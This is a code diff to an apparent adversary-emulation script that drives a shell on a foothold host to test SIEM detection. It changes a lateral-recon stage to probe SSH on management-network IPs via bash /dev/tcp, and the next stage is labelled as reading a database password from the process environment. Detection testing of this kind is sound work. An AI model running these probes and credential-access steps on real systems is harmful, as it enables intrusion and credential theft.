@@ -114,8 +114,14 @@ def drive(sock: socket.socket, dbpw_holder: dict, transcript: list) -> None:
     # stage 3: who/where am I, then a blocked lateral probe
     log("STAGE 3  discovery (foothold identity + blocked recon)", transcript)
     run(sock, "id; hostname; echo cwd=$PWD", transcript)
-    run(sock, "timeout 3 bash -c 'echo > /dev/tcp/10.10.1.41/22' 2>&1; "
-              "echo 'probe db-01:22 rc='$?  '(124=dropped by firewall)'", transcript)
+    # Scan toward the management network (prom-01, siem-01) -- hosts the call graph never lets an API
+    # reach. Each SYN is dropped by the firewall and logged (eth0-egress) -> Wazuh rule 100122. ssh (22)
+    # is never used internally, so this is unambiguous lateral recon. (A same-tier probe like db-01:22
+    # is dropped too but logged under eth0-ingress, which the host agent does not ship -- see
+    # docs/threats/apt.md; the management-network probe is the clean, detected signal.)
+    for tgt in ("10.10.0.10", "10.10.0.20"):
+        run(sock, f"timeout 3 bash -c 'echo > /dev/tcp/{tgt}/22' 2>&1; "
+                  f"echo 'probe {tgt}:22 rc='$? '(124=dropped by firewall)'", transcript)
 
     # stage 4: credential access -- DB password from the process environment
     log("STAGE 4  credential access (read DB_PASSWORD from the process env)", transcript)
